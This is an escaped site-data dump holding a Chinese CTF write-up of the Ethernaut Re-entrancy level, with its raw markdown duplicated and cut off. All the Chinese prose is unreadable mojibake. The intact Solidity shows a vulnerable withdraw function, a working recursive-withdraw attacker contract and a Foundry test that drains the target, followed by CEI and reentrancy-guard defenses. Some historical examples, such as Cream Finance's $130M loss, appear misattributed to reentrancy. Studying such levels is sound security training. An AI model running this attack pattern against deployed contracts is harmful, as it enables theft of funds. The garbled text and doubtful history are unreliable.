title=\"åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼\"></a>åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼</h3><table>\n<thead>\n<tr>\n<th>æ–¹å¼</th>\n<th>å¯è¢«é˜»æ­¢</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>æ­£å¸¸è½¬è´¦</strong></td>\n<td>âœ… æ˜¯</td>\n<td>éœ€è¦ payable å‡½æ•°</td>\n</tr>\n<tr>\n<td><strong>selfdestruct</strong></td>\n<td>âŒ å¦</td>\n<td>å¼ºåˆ¶å‘é€ï¼Œæ— æ³•æ‹’ç»</td>\n</tr>\n<tr>\n<td><strong>é¢„è®¡ç®—åœ°å€</strong></td>\n<td>âŒ å¦</td>\n<td>å‘é€åˆ°æœªæ¥åœ°å€</td>\n</tr>\n<tr>\n<td><strong>çŸ¿å·¥å¥–åŠ±</strong></td>\n<td>âŒ å¦</td>\n<td>Coinbase å¥–åŠ±</td>\n</tr>\n</tbody></table>\n<h3 id=\"å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ\"><a href=\"#å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ\" class=\"headerlink\" title=\"å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ\"></a>å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨çš„æ¨¡å¼</span><br><span class=\"line\">contract BadPattern &#123;</span><br><span class=\"line\">    function criticalFunction() public &#123;</span><br><span class=\"line\">        require(address(this).balance == 0, &quot;Must be empty&quot;);</span><br><span class=\"line\">        // é€»è¾‘...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨çš„æ¨¡å¼  </span><br><span class=\"line\">contract GoodPattern &#123;</span><br><span class=\"line\">    uint256 private expectedBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function criticalFunction() public &#123;</span><br><span class=\"line\">        require(expectedBalance == 0, &quot;Expected balance must be zero&quot;);</span><br><span class=\"line\">        // é€»è¾‘...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function updateExpectedBalance(uint256 amount) private &#123;</span><br><span class=\"line\">        expectedBalance = amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Force å…³å¡æ•™å¯¼äº†é‡è¦çš„ä»¥å¤ªå¸å¤„ç†åŸåˆ™ï¼š</p>\n<ul>\n<li>âœ… <strong>æ°¸è¿œä¸è¦ä¾èµ– <code>address(this).balance</code></strong> - å¯ä»¥è¢«å¼ºåˆ¶ä¿®æ”¹</li>\n<li>âœ… <strong>ä½¿ç”¨å†…éƒ¨çŠ¶æ€è·Ÿè¸ªä½™é¢</strong> - æ›´åŠ å®‰å…¨å¯é </li>\n<li>âœ… <strong>ç†è§£ selfdestruct çš„å¼ºåˆ¶æ€§</strong> - æ— æ³•è¢«åˆçº¦æ‹’ç»</li>\n<li>âœ… <strong>è®¾è®¡æ—¶è€ƒè™‘æ„å¤–èµ„é‡‘</strong> - å¤„ç†éé¢„æœŸçš„ä»¥å¤ªå¸</li>\n</ul>\n<p>è¿™ä¸ªçœ‹ä¼¼ç®€å•çš„æ”»å‡»æ­ç¤ºäº†ä»¥å¤ªåŠè™šæ‹Ÿæœºå±‚é¢çš„é‡è¦ç‰¹æ€§ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">ä¸Šä¸€å…³: Level 6 - Delegation</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">ä¸‹ä¸€å…³: Level 8 - Vault</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 10: Re-entrancy - ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£","date":"2025-01-25T06:30:00.000Z","updated":"2025-01-25T06:30:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å­¦ä¹ æœ€è‘—åçš„æ™ºèƒ½åˆçº¦æ”»å‡»æŠ€æœ¯ - é‡å…¥æ”»å‡»ï¼Œç†è§£å…¶åŸç†ã€å®ç°å’Œé˜²æŠ¤æªæ–½ï¼Œè¿™æ˜¯æ¯ä¸ªæ™ºèƒ½åˆçº¦å¼€å‘è€…å¿…é¡»æŒæ¡çš„å®‰å…¨çŸ¥è¯†ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 10: Re-entrancy - ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 10 - Re-entrancy](https://ethernaut.openzeppelin.com/level/10)  \n> **æ”»å‡»ç±»å‹**: é‡å…¥æ”»å‡» (Reentrancy Attack)  \n> **éš¾åº¦**: â­â­â­â­â˜†  \n> **å†å²å½±å“**: The DAO æ”»å‡»äº‹ä»¶ (2016å¹´)\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨é¢†åŸŸæœ€ç»å…¸çš„æ”»å‡»ç±»å‹ä¹‹ä¸€ï¼š\n\n1. **çªƒå–åˆçº¦èµ„é‡‘** - æå–è¶…è¿‡è‡ªå·±å­˜æ¬¾é‡‘é¢çš„ä»¥å¤ªå¸\n2. **ç†è§£é‡å…¥åŸç†** - æŒæ¡çŠ¶æ€æ›´æ–°æ—¶åºé—®é¢˜\n3. **å­¦ä¹ é˜²æŠ¤æªæ–½** - äº†è§£å¦‚ä½•ç¼–å†™å®‰å…¨çš„ææ¬¾å‡½æ•°\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.6.12;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  // ğŸš¨ æ¼æ´å‡½æ•°\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        balances[msg.sender] -= _amount;  // âŒ çŠ¶æ€æ›´æ–°åœ¨å¤–éƒ¨è°ƒç”¨ä¹‹å\n      }\n    }\n  }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\né‡å…¥æ”»å‡»çš„æ ¹æœ¬åŸå› æ˜¯ **æ£€æŸ¥-æ•ˆæœ-äº¤äº’ (CEI)** æ¨¡å¼çš„è¿åï¼š\n\n```solidity\nfunction withdraw(uint _amount) public {\n    // âœ… æ£€æŸ¥ (Check)\n    if(balances[msg.sender] >= _amount) {\n        \n        // âŒ äº¤äº’ (Interaction) - è¿‡æ—©è¿›è¡Œå¤–éƒ¨è°ƒç”¨\n        (bool result,) = msg.sender.call{value:_amount}(\"\");\n        \n        if(result) {\n            // âŒ æ•ˆæœ (Effect) - çŠ¶æ€æ›´æ–°å¤ªæ™š\n            balances[msg.sender] -= _amount;\n        }\n    }\n}\n```\n\n### æ”»å‡»åŸç†\n\n1. **æ¶æ„åˆçº¦å­˜æ¬¾** - å‘ç›®æ ‡åˆçº¦å­˜å…¥å°‘é‡èµ„é‡‘\n2. **è°ƒç”¨ææ¬¾å‡½æ•°** - è§¦å‘ `withdraw()` å‡½æ•°\n3. **æ¥æ”¶å›è°ƒ** - åœ¨ `call` æ‰§è¡Œæ—¶è§¦å‘æ¶æ„åˆçº¦çš„ `receive()` å‡½æ•°\n4. **é€’å½’è°ƒç”¨** - åœ¨çŠ¶æ€æ›´æ–°å‰å†æ¬¡è°ƒç”¨ `withdraw()`\n5. **é‡å¤æå–** - ç”±äºä½™é¢æœªæ›´æ–°ï¼Œå¯ä»¥å¤šæ¬¡æå–èµ„é‡‘\n\n### æ”»å‡»æµç¨‹å›¾\n\n```\nç”¨æˆ·è°ƒç”¨ withdraw(1 ether)\n    â†“\næ£€æŸ¥ balances[attacker] >= 1 ether âœ…\n    â†“\nå‘é€ 1 ether åˆ°æ”»å‡»è€…åˆçº¦\n    â†“\næ”»å‡»è€…åˆçº¦çš„ receive() è¢«è§¦å‘\n    â†“\nå†æ¬¡è°ƒç”¨ withdraw(1 ether)\n    â†“\næ£€æŸ¥ balances[attacker] >= 1 ether âœ… (ä½™é¢æœªæ›´æ–°!)\n    â†“\nå†æ¬¡å‘é€ 1 ether...\n    â†“\nå¦‚æ­¤é‡å¤ï¼Œç›´åˆ°åˆçº¦ä½™é¢è€—å°½\n```\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Reentrance.sol\";\n\ncontract ReentrancyAttacker {\n    Reentrance public target;\n    uint public amount;\n    \n    constructor(address _target) {\n        target = Reentrance(_target);\n    }\n    \n    function attack() external payable {\n        amount = msg.value;\n        \n        // æ­¥éª¤1: å…ˆå­˜å…¥ä¸€äº›èµ„é‡‘å»ºç«‹ä½™é¢\n        target.donate{value: amount}(address(this));\n        \n        // æ­¥éª¤2: å¼€å§‹é‡å…¥æ”»å‡»\n        target.withdraw(amount);\n    }\n    \n    // é‡å…¥æ”»å‡»çš„æ ¸å¿ƒ - receiveå‡½æ•°\n    receive() external payable {\n        if (address(target).balance >= amount) {\n            // é€’å½’è°ƒç”¨withdrawï¼Œå®ç°é‡å…¥\n            target.withdraw(amount);\n        }\n    }\n    \n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract ReentranceTest is Test {\n    Reentrance public reentrance;\n    ReentrancyAttacker public attacker;\n    \n    address public user1 = makeAddr(\"user1\");\n    address public user2 = makeAddr(\"user2\");\n    address public attackerAddr = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        reentrance = new Reentrance();\n        \n        // ç»™ç”¨æˆ·ä¸€äº›åˆå§‹èµ„é‡‘\n        vm.deal(user1, 10 ether);\n        vm.deal(user2, 10 ether);\n        vm.deal(attackerAddr, 2 ether);\n        \n        // æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·å­˜æ¬¾\n        vm.prank(user1);\n        reentrance.donate{value: 5 ether}(user1);\n        \n        vm.prank(user2);\n        reentrance.donate{value: 5 ether}(user2);\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        vm.prank(attackerAddr);\n        attacker = new ReentrancyAttacker(address(reentrance));\n    }\n\n    function testReentrancyAttack() public {\n        uint256 contractBalanceBefore = address(reentrance).balance;\n        uint256 attackerBalanceBefore = attackerAddr.balance;\n        \n        console.log(\"åˆçº¦ä½™é¢ (æ”»å‡»å‰):\", contractBalanceBefore);\n        console.log(\"æ”»å‡»è€…ä½™é¢ (æ”»å‡»å‰):\", attackerBalanceBefore);\n        \n        // æ‰§è¡Œé‡å…¥æ”»å‡»\n        vm.prank(attackerAddr);\n        attacker.attack{value: 1 ether}();\n        \n        uint256 contractBalanceAfter = address(reentrance).balance;\n        uint256 attackerBalanceAfter = attacker.getBalance();\n        \n        console.log(\"åˆçº¦ä½™é¢ (æ”»å‡»å):\", contractBalanceAfter);\n        console.log(\"æ”»å‡»è€…ä½™é¢ (æ”»å‡»å):\", attackerBalanceAfter);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(contractBalanceAfter, 0);\n        assertGt(attackerBalanceAfter, 1 ether); // è·å¾—è¶…è¿‡æŠ•å…¥çš„èµ„é‡‘\n    }\n    \n    function testReentrancyDetails() public {\n        vm.prank(attackerAddr);\n        \n        // è®°å½•æ¯æ¬¡withdrawè°ƒç”¨\n        vm.recordLogs();\n        attacker.attack{value: 1 ether}();\n        \n        // éªŒè¯æ”»å‡»è€…çš„ä½™é¢è®°å½•\n        assertEq(reentrance.balanceOf(address(attacker)), 0); // æœ€ç»ˆä½™é¢ä¸º0\n        assertEq(address(reentrance).balance, 0); // åˆçº¦è¢«æç©º\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œé‡å…¥æ”»å‡»æµ‹è¯•\nforge test --match-contract ReentranceTest -vvv\n\n# è¾“å‡ºåº”è¯¥æ˜¾ç¤ºåˆçº¦ä½™é¢è¢«å®Œå…¨æç©º\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. CEI æ¨¡å¼ (Check-Effects-Interactions)\n\n```solidity\ncontract SecureReentrance {\n    mapping(address => uint) public balances;\n    \n    function withdraw(uint _amount) public {\n        // âœ… æ£€æŸ¥ (Check)\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        // âœ… æ•ˆæœ (Effect) - å…ˆæ›´æ–°çŠ¶æ€\n        balances[msg.sender] -= _amount;\n        \n        // âœ… äº¤äº’ (Interaction) - æœ€åè¿›è¡Œå¤–éƒ¨è°ƒç”¨\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 2. é‡å…¥é” (Reentrancy Guard)\n\n```solidity\ncontract ReentrancyGuarded {\n    bool private locked;\n    mapping(address => uint) public balances;\n    \n    modifier noReentrant() {\n        require(!locked, \"Reentrant call\");\n        locked = true;\n        _;\n        locked = false;\n    }\n    \n    function withdraw(uint _amount) public noReentrant {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _amount;\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 3. ä½¿ç”¨ OpenZeppelin çš„ ReentrancyGuard\n\n```solidity\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract SafeContract is ReentrancyGuard {\n    mapping(address => uint) public balances;\n    \n    function withdraw(uint _amount) public nonReentrant {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _amount;\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 4. ä½¿ç”¨ transfer() è€Œé call()\n\n```solidity\n// âš ï¸ æœ‰é™é˜²æŠ¤ï¼ˆä¸æ¨èä½œä¸ºå”¯ä¸€é˜²æŠ¤æªæ–½ï¼‰\nfunction withdraw(uint _amount) public {\n    require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n    \n    balances[msg.sender] -= _amount;\n    payable(msg.sender).transfer(_amount); // é™åˆ¶ Gas ä¸º 2300\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. é‡å…¥æ”»å‡»ç±»å‹\n\n| ç±»å‹ | æè¿° | ç¤ºä¾‹ |\n|------|------|------|\n| **å•å‡½æ•°é‡å…¥** | æ”»å‡»åŒä¸€ä¸ªå‡½æ•° | æœ¬å…³å¡çš„ `withdraw()` |\n| **è·¨å‡½æ•°é‡å…¥** | æ”»å‡»ä¸åŒå‡½æ•° | `withdraw()` â†’ `transfer()` |\n| **è·¨åˆçº¦é‡å…¥** | æ”»å‡»ä¸åŒåˆçº¦ | DeFi åè®®é—´çš„å¤æ‚é‡å…¥ |\n\n### 2. Gas é™åˆ¶å¯¹æ¯”\n\n```solidity\n// transfer/send: 2300 gas (ä¸è¶³ä»¥è¿›è¡Œé‡å…¥)\npayable(msg.sender).transfer(amount);\n\n// call: è½¬å‘æ‰€æœ‰å‰©ä½™ gas (å¯èƒ½å¯¼è‡´é‡å…¥)\n(bool success,) = msg.sender.call{value: amount}(\"\");\n```\n\n### 3. çŠ¶æ€æ›´æ–°æ—¶åº\n\n```solidity\n// âŒ é”™è¯¯æ¨¡å¼\nfunction vulnerable() public {\n    require(condition);        // Check\n    externalCall();           // Interaction (å±é™©!)\n    updateState();            // Effect (å¤ªæ™šäº†)\n}\n\n// âœ… æ­£ç¡®æ¨¡å¼\nfunction secure() public {\n    require(condition);        // Check\n    updateState();            // Effect (å…ˆæ›´æ–°çŠ¶æ€)\n    externalCall();           // Interaction (å®‰å…¨)\n}\n```\n\n## ğŸ›ï¸ å†å²æ¡ˆä¾‹\n\n### The DAO æ”»å‡» (2016å¹´6æœˆ)\n\n- **æŸå¤±**: 360ä¸‡ ETH (å½“æ—¶ä»·å€¼çº¦6000ä¸‡ç¾å…ƒ)\n- **åŸå› **: splitDAO å‡½æ•°å­˜åœ¨é‡å…¥æ¼æ´\n- **åæœ**: ä»¥å¤ªåŠç¡¬åˆ†å‰ï¼Œäº§ç”Ÿ ETH å’Œ ETC\n- **æ•™è®­**: é‡å…¥æ”»å‡»çš„ç ´åæ€§å’Œé˜²æŠ¤é‡è¦æ€§\n\n### å…¶ä»–è‘—åæ¡ˆä¾‹\n\n1. **Cream Finance** (2021) - 1.3äº¿ç¾å…ƒæŸå¤±\n2. **bZx Protocol** (2020) - å¤šæ¬¡é‡å…¥æ”»å‡»\n3. **Uniswap V1** (æ—©æœŸç‰ˆæœ¬) - ç†è®ºæ¼æ´\n\n## ğŸ¯ æ€»ç»“\n\né‡å…¥æ”»å‡»æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨çš„åŸºçŸ³çŸ¥è¯†ï¼š\n\n- âœ… **ç†è§£ CEI æ¨¡å¼çš„é‡è¦æ€§**\n- âœ… **æŒæ¡å¤šç§é˜²æŠ¤æªæ–½çš„ä½¿ç”¨**\n- âœ… **è®¤è¯†çŠ¶æ€ç®¡ç†çš„å…³é”®æ€§**\n- âœ… **å­¦ä¹ å†å²æ¡ˆä¾‹çš„æ•™è®­**\n\né‡å…¥æ”»å‡»çœ‹ä¼¼ç®€å•ï¼Œä½†å…¶å˜ç§å’Œç»„åˆå½¢å¼åœ¨ç°ä»£ DeFi åè®®ä¸­ä»ç„¶æ˜¯ä¸»è¦å¨èƒã€‚æŒæ¡å…¶åŸç†å’Œé˜²æŠ¤æªæ–½æ˜¯æ¯ä¸ªæ™ºèƒ½åˆçº¦å¼€å‘è€…çš„å¿…ä¿®è¯¾ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**\n- **[ä¸‹ä¸€å…³: Level 11 - Elevator](/2025/01/25/ethernaut-level-11-elevator/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*å®‰å…¨çš„åˆçº¦ä¸ä»…è¦åšæ­£ç¡®çš„äº‹ï¼Œè¿˜è¦ä»¥æ­£ç¡®çš„é¡ºåºåšäº‹ã€‚* ğŸ”","source":"_posts/ethernaut-level-10-reentrancy.md","raw":"---\ntitle: 'Ethernaut Level 10: Re-entrancy - ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£'\ndate: 2025-01-25 14:30:00\nupdated: 2025-01-25 14:30:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - é‡å…¥æ”»å‡»\n  - Reentrancy\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\n  - CEIæ¨¡å¼\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å­¦ä¹ æœ€è‘—åçš„æ™ºèƒ½åˆçº¦æ”»å‡»æŠ€æœ¯ - é‡å…¥æ”»å‡»ï¼Œç†è§£å…¶åŸç†ã€å®ç°å’Œé˜²æŠ¤æªæ–½ï¼Œè¿™æ˜¯æ¯ä¸ªæ™ºèƒ½åˆçº¦å¼€å‘è€…å¿…é¡»æŒæ¡çš„å®‰å…¨çŸ¥è¯†ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 10: Re-entrancy - ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 10 - Re-entrancy](https://ethernaut.openzeppelin.com/level/10)  \n> **æ”»å‡»ç±»å‹**: é‡å…¥æ”»å‡» (Reentrancy Attack)  \n> **éš¾åº¦**: â­â­â­â­â˜†  \n> **å†å²å½±å“**: The DAO æ”»å‡»äº‹ä»¶ (2016å¹´)\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨é¢†åŸŸæœ€ç»å…¸çš„æ”»å‡»ç±»å‹ä¹‹ä¸€ï¼š\n\n1. **çªƒå–åˆçº¦èµ„é‡‘** - æå–è¶…è¿‡è‡ªå·±å­˜æ¬¾é‡‘é¢çš„ä»¥å¤ªå¸\n2. **ç†è§£é‡å…¥åŸç†** - æŒæ¡çŠ¶æ€æ›´æ–°æ—¶åºé—®é¢˜\n3. **å­¦ä¹ é˜²æŠ¤æªæ–½** - äº†è§£å¦‚ä½•ç¼–å†™å®‰å…¨çš„ææ¬¾å‡½æ•°\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.6.12;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  // ğŸš¨ æ¼æ´å‡½æ•°\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        balances[msg.sender] -= _amount;  // âŒ çŠ¶æ€æ›´æ–°åœ¨å¤–éƒ¨è°ƒç”¨ä¹‹å\n      }\n    }\n  }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\né‡å…¥æ”»å‡»çš„æ ¹æœ¬åŸå› æ˜¯ **æ£€æŸ¥-æ•ˆæœ-äº¤äº’ (CEI)** æ¨¡å¼çš„è¿åï¼š\n\n```solidity\nfunction withdraw(uint _amount) public {\n    // âœ… æ£€æŸ¥ (Check)\n    if(balances[msg.sender] >= _amount) {\n        \n        // âŒ äº¤äº’ (Interaction) - è¿‡æ—©è¿›è¡Œå¤–éƒ¨è°ƒç”¨\n        (bool result,) = msg.sender.call{value:_amount}(\"\");\n        \n        if(result) {\n            // âŒ æ•ˆæœ (Effect) - çŠ¶æ€æ›´æ–°å¤ªæ™š\n            balances[msg.sender] -= _amount;\n        }\n    }\n}\n```\n\n### æ”»å‡»åŸç†\n\n1. **æ¶æ„åˆçº¦å­˜æ¬¾** - å‘ç›®æ ‡åˆçº¦å­˜å…¥å°‘é‡èµ„é‡‘\n2. **è°ƒç”¨ææ¬¾å‡½æ•°** - è§¦å‘ `withdraw()` å‡½æ•°\n3. **æ¥æ”¶å›è°ƒ** - åœ¨ `call` æ‰§è¡Œæ—¶è§¦å‘æ¶æ„åˆçº¦çš„ `receive()` å‡½æ•°\n4. **é€’å½’è°ƒç”¨** - åœ¨çŠ¶æ€æ›´æ–°å‰å†æ¬¡è°ƒç”¨ `withdraw()`\n5. **é‡å¤æå–** - ç”±äºä½™é¢æœªæ›´æ–°ï¼Œå¯ä»¥å¤šæ¬¡æå–èµ„é‡‘\n\n### æ”»å‡»æµç¨‹å›¾\n\n```\nç”¨æˆ·è°ƒç”¨ withdraw(1 ether)\n    â†“\næ£€æŸ¥ balances[attacker] >= 1 ether âœ…\n    â†“\nå‘é€ 1 ether åˆ°æ”»å‡»è€…åˆçº¦\n    â†“\næ”»å‡»è€…åˆçº¦çš„ receive() è¢«è§¦å‘\n    â†“\nå†æ¬¡è°ƒç”¨ withdraw(1 ether)\n    â†“\næ£€æŸ¥ balances[attacker] >= 1 ether âœ… (ä½™é¢æœªæ›´æ–°!)\n    â†“\nå†æ¬¡å‘é€ 1 ether...\n    â†“\nå¦‚æ­¤é‡å¤ï¼Œç›´åˆ°åˆçº¦ä½™é¢è€—å°½\n```\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Reentrance.sol\";\n\ncontract ReentrancyAttacker {\n    Reentrance public target;\n    uint public amount;\n    \n    constructor(address _target) {\n        target = Reentrance(_target);\n    }\n    \n    function attack() external payable {\n        amount = msg.value;\n        \n        // æ­¥éª¤1: å…ˆå­˜å…¥ä¸€äº›èµ„é‡‘å»ºç«‹ä½™é¢\n        target.donate{value: amount}(address(this));\n        \n        // æ­¥éª¤2: å¼€å§‹é‡å…¥æ”»å‡»\n        target.withdraw(amount);\n    }\n    \n    // é‡å…¥æ”»å‡»çš„æ ¸å¿ƒ - receiveå‡½æ•°\n    receive() external payable {\n        if (address(target).balance >= amount) {\n            // é€’å½’è°ƒç”¨withdrawï¼Œå®ç°é‡å…¥\n            target.withdraw(amount);\n        }\n    }\n    \n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract ReentranceTest is Test {\n    Reentrance public reentrance;\n    ReentrancyAttacker public attacker;\n    \n    address public user1 = makeAddr(\"user1\");\n    address public user2 = makeAddr(\"user2\");\n    address public attackerAddr = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        reentrance = new Reentrance();\n        \n        // ç»™ç”¨æˆ·ä¸€äº›åˆå§‹èµ„é‡‘\n        vm.deal(user1, 10 ether);\n        vm.deal(user2, 10 ether);\n        vm.deal(attackerAddr, 2 ether);\n        \n        // æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·å­˜æ¬¾\n        vm.prank(user1);\n        reentrance.donate{value: 5 ether}(user1);\n        \n        vm.prank(user2);\n        reentrance.donate{value: 5 ether}(user2);\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        vm.prank(attackerAddr);\n        attacker = new ReentrancyAttacker(address(reentrance));\n    }\n\n    function testReentrancyAttack() public {\n        uint256 contractBalanceBefore = address(reentrance).balance;\n        uint256 attackerBalanceBefore = attackerAddr.balance;\n        \n        console.log(\"åˆçº¦ä½™é¢ (æ”»å‡»å‰):\", contractBalanceBefore);\n        console.log(\"æ”»å‡»è€…ä½™é¢ (æ”»å‡»å‰):\", attackerBalanceBefore);\n        \n        // æ‰§è¡Œé‡å…¥æ”»å‡»\n        vm.prank(attackerAddr);\n        attacker.attack{value: 1 ether}();\n        \n        uint256 contractBalanceAfter = address(reentrance).balance;\n        uint256 attackerBalanceAfter = attacker.getBalance();\n        \n        console.log(\"åˆçº¦ä½™é¢ (æ”»å‡»å):\", contractBalanceAfter);\n        console.log(\"æ”»å‡»è€…ä½™é¢ (æ”»å‡»å):\", attackerBalanceAfter);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(contractBalanceAfter, 0);\n        assertGt(attackerBalanceAfter, 1 ether); // è·å¾—è¶…è¿‡æŠ•å…¥çš„èµ„é‡‘\n    }\n    \n    function testReentrancyDetails() public {\n        vm.prank(attackerAddr);\n        \n        // è®°å½•æ¯æ¬¡withdrawè°ƒç”¨\n        vm.recordLogs();\n        attacker.attack{value: 1 ether}();\n        \n        // éªŒè¯æ”»å‡»è€…çš„ä½™é¢è®°å½•\n        assertEq(reentrance.balanceOf(address(attacker)), 0); // æœ€ç»ˆä½™é¢ä¸º0\n        assertEq(address(reentrance).balance, 0); // åˆçº¦è¢«æç©º\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œé‡å…¥æ”»å‡»æµ‹è¯•\nforge test --match-contract ReentranceTest -vvv\n\n# 